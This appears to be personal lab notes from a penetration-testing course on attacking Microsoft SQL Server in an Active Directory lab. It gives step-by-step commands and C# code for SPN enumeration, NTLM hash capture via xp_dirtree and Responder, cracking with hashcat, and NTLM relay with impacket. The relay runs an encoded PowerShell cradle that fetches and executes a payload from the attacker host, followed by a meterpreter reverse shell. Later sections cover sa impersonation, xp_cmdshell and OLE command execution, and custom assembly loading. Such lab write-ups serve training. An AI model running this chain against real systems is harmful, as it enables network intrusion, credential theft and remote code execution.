# Summary 

## Network
```sh
192.168.49.65 Attacker
192.168.65.5 Microsoft SQL Attacks - Group 1 - dc01 OS Credentials: offsec / lab
192.168.65.6 Microsoft SQL Attacks - Group 1 - appsrv01 OS Credentials: offsec / lab
192.168.65.10 Microsoft SQL Attacks - Group 1 - client01 OS Credentials: offsec / lab
```

## 1. Scan for servers:
From the compromised windows 
```sh
setspn -T corp1 -Q MSSQLSvc/*

Checking domain DC=corp1,DC=com
CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com
    MSSQLSvc/dc01.corp1.com:1433
    MSSQLSvc/dc01.corp1.com:SQLEXPRESS
    MSSQLSvc/appsrv01.corp1.com:1433
    MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS

Existing SPN found!
```

Enumerate the logins that allow impersonation:
- sa can be impersonated
```sql
String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";

SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();

while(reader.Read() == true) {
	Console.WriteLine("Logins that can be impersonated: " + reader[0]);
}
reader.Close();
```

## 2. Test Connection to SQL
Write a quick cs script to connect to the database
- Execute `USER_NAME()` query
- Execute `IS_SRVROLEMEMBER`
```cs
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
			try {
				con.Open();
				Console.WriteLine("Authenticated");
			}
			catch {
				Console.WriteLine("Failed");
				Environment.Exit(0);
			}
			con.Close();
        }
    }
} 
```
## 3. Enumerate

Current User:
```cs
String querylogin = "SELECT SYSTEM_USER;";
SqlCommand command = new SqlCommand(querylogin, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Logged in as: " + reader[0]);
reader.Close();
```

Determine if the user has a role named 'public'
```cs
String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
command = new SqlCommand(querypublicrole, con);
reader = command.ExecuteReader();
reader.Read();
Int32 role = Int32.Parse(reader[0].ToString());
if(role == 1)
{
  Console.WriteLine("User is a member of public role");
}
else
{
  Console.WriteLine("User is NOT a member of public role");
}
reader.Close();
```

## 4.Capture Hash 
Write a query that uses xp_dirtree and compile.
- This is the address of your attacking machine.
```cs
String query = "EXEC master..xp_dirtree \"\\\\192.168.65\\\\test\";";
```

Shutdown Existing Samba Shares on kali, and start responder
```sh
sudo systemctl stop smbd nmdb
ifconfig
responder -T eth0
```
Hash
```sh
[SMB] NTLMv2-SSP Client   : 192.168.65.5
[SMB] NTLMv2-SSP Username : CORP1\sqlsvc
[SMB] NTLMv2-SSP Hash     : sqlsvc::CORP1:fbe97d48d6c33130:E8D269DE6E95A3338F661A44545DFCB0:010100000000000080D1F7875B95DC01B32D45F91C30F0EE0000000002000800520050005900410001001E00570049004E002D00500044004C004A004F0032005600370038004F00510004003400570049004E002D00500044004C004A004F0032005600370038004F0051002E0052005000590041002E004C004F00430041004C000300140052005000590041002E004C004F00430041004C000500140052005000590041002E004C004F00430041004C000700080080D1F7875B95DC0106000400020000000800300030000000000000000000000000300000D9612B035631CC25294E01C82C45B54B7407DE5782B80042D960A8EA1C9D05400A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00360035000000000000000000 
```

## 5. Crack Hash
Cracking will reveal
username: sqlsvc
password: lab
```sh
hashcat -m 5600 hash.txt dict.txt --force
```

## 6. IMPACKET Relay Attack
- Install impacket
- Install powershell 
Create a payload
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.65 LPORT=443 -f ps1
```

Choose a [CodeRunners](../../Exploitation/CodeRunners/Powershell/reflective-shellcode.ps1) and add the payload

Save this file as `run.txt` and start a webserver:
```py
python -m http.server 80
```

Use the a [Download Cradle](../../Exploitation/DownloadCradles/Powershell/b64encoded-downloadstring.ps1) with base64 encoding. 
- Attacker ip used

On the kali machine start impacket with the encoded payload.
- target ip of relay is `appSrv01`
- base64 encoded text is the result of the download cradle
- Target of cradle is a powershell code runner that uses the add-type method to start the handler.
- Powershell is needed here
```sh
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.65.6 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADYANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 192.168.65.5, attacking target smb://192.168.65.6
[*] (SMB): Authenticating connection from CORP1/SQLSVC@192.168.65.5 against smb://192.168.65.6 SUCCEED [1]
[*] All targets processed!
```

Start a reverse handler:
```sh
sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.49.65; set LPORT 443; exploit"

meterpreter>
```

On windows, run the exe that executes the xp_dirtree command:
```sh
sql.exe
```

you should see output for impacket, webserver for file download, and a reverse handler connection

## Escalation & Impersonation
Attempt to impersonate:
```sql
Console.WriteLine("Before impersonation");
String querylogin = "SELECT SYSTEM_USER;";
SqlCommand command = new SqlCommand(querylogin, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing in the context of: " + reader[0]);
reader.Close();

String executeas = "EXECUTE AS LOGIN = 'sa';";
command = new SqlCommand(executeas, con);
reader = command.ExecuteReader();
reader.Close();

Console.WriteLine("After impersonation");
querylogin = "SELECT SYSTEM_USER;";
command = new SqlCommand(querylogin, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing in the context of: " + reader[0]);
reader.Close();
```
The output will indicate that you started as a default user and ended as sa. Confirming your test.

Another method that involes the TRUSTWORTHY property:
- change to msdb which has the trustworthy set by default
- the guest user has been given the permissions to impersonate dbo in msdb
- misconfig vuln
```sql
String executeas = "use msdb; EXECUTE AS USER = 'dbo';";

command = new SqlCommand(executeas, con);
reader = command.ExecuteReader();
reader.Close();

Console.WriteLine("After impersonation:");
querylogin = "SELECT USER_NAME();";
command = new SqlCommand(querylogin, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing in the context of: " + reader[0]);
reader.Close();
```

## Code Execution
Execute whoami
```sql
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
String execCmd = "EXEC xp_cmdshell whoami";

SqlCommand command = new SqlCommand(impersonateUser, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enable_xpcmd, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Result of command is: " + reader[0]);
reader.Close();
```

OLE object (sp_oaCreate, sp_oaMethod)
```sql
String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";

SqlCommand command = new SqlCommand(impersonateUser, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(enable_ole, con);
reader = command.ExecuteReader();
reader.Close();

command = new SqlCommand(execCmd, con);
reader = command.ExecuteReader();
reader.Close();
```

## Custom Assemblies
[Create stored procedure](../../Execution/Windows/MSSQL/Code/code-execution-stored-procedure.cs)
Compile dll
```
csc /target:library /r:System.dll,System.Data.dll /out:sp.dll sp.cs
```

Convert to HEX
```ps
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\sp.dll")
[System.Convert]::ToHexString($bytes) | Out-File "result.txt"
```

Paste the results into [code-execution-assembly.cs]( ../../Execution/Windows/MSSQL/Code/code-execution-assembly.cs)
- make sure to prefix with `0x`
- proper format should have PE headers MZ 4D
